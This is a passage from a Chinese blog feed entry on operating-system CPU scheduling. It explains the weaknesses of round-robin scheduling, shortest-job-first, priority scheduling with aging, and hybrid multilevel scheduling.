<p>但是，时间片轮转的系统响应时间也不一定总是比FCFS的响应时间短。时间片轮转是一种大锅饭的做法，但是现实生活中却是走的“一部分人先富，先富带动后富”的路线。例如，如果有30个任务，其中一个任务只需要1秒时间执行，而其他29个任务需要30秒钟执行，如果因为某种原因，这个只要1秒钟的任务排在另外29个任务的后面轮转，则它需要等待29秒钟才能执行（假定时间片为1秒）。于是，这个任务的响应时间和交互体验就变得非常差。因此，短任务优先算法被提出。</p>
<h5 id="短任务优先算法"><a href="#短任务优先算法" class="headerlink" title="短任务优先算法"></a>短任务优先算法</h5><p>短任务优先算法的核心是所有的任务并不都一样，而是有优先级的区分。具体来说，就是短任务的优先级比长任务的高，而我们总是安排优先级高的任务先运行。</p>
<p>短任务优先算法又分为两种类型：一种是非抢占式，一种是抢占式。非抢占式当已经在CPU上运行的任务结束或阻塞时，从候选任务中选择执行时间最短的进程来执行。而抢占式则是每增加一个新的进程就需要对所有进程（包括正在CPU上运行的进程）进行检查，谁的时间短就运行谁。</p>
<p>由于短任务优先总是运行需要执行时间最短的程序，因此其系统平均响应时间在以上几种算法中是最优的，这也是短任务优先算法的优点。但短任务优先算法也有缺点：一是可能造成长任务无法得到CPU时间从而导致“肌饿”。二是如何知道每个进程还需要运转多久？于是为了解决第一个缺点，优先级调度算法被提出。而第二个缺点则可以采取一些启发式的方法来进行估算，目前很多的人工智能算法都可以做这个事。</p>
<h5 id="优先级调度算法"><a href="#优先级调度算法" class="headerlink" title="优先级调度算法"></a>优先级调度算法</h5><p>优先级调度算法给每个进程赋予一个优先级，每次需要进程切换时，找一个优先级最高的进程进行调度。这样如果赋予长进程一个高优先级，则该进程就不会再“饥饿”。事实上，短任务优先算法本身就是一种优先级调度，只不过它给予短进程更高的优先级而已。</p>
<p>该算法的优点在于可以赋予重要的进程以高优先级以确保重要任务能够得到CPU时间，其缺点则有二：一是低优先级的进程可能会“饥饿”，二是响应时间无法保证。第一个缺点可以通过动态地调节任务的优先级解决，例如一个进程如果等待时间过长，其优先级将因持续提升而超越其他进程的优先级，从而得到CPU时间。第二个缺点可以通过将一个进程优先级设置为最高来解决，但即使将优先级设置为最高，但如果每个人都将自己的进程优先级设置为最高，其响应时间还是无法保证。</p>
<h5 id="混合调度算法"><a href="#混合调度算法" class="headerlink" title="混合调度算法"></a>混合调度算法</h5><p>之前的算法都存在一定缺点，那么可否有一个算法混合他们的优点，摒弃它们的缺点，这就是所谓的混合调度算法。混合调度算法将所有进程分为不同的大类，每个大类为一个优先级。如果两个进程处于不同的大类，则处于高优先级大类的进程优先执行；如果处于同一个大类，则采用时间片轮转算法来执行。混合调度算法的示意图如下图所示：</p>
<p><img src="/images/操作系统-关于cpu管理05.jpg" alt="混合方法"></p>
<h4 id="进程调度的过程"><a href="#进程调度的过程" class="headerlink" title="进程调度的过程"></a>进程调度的过程</h4><p><img src="/images/操作系统-关于cpu管理06.jpg" alt="调度过程"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/edisonchou/p/5003694.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;进程&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;从单任务到多道任务&quot;&gt;&lt;a href=&quot;#从单任务到多道
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
</feed>
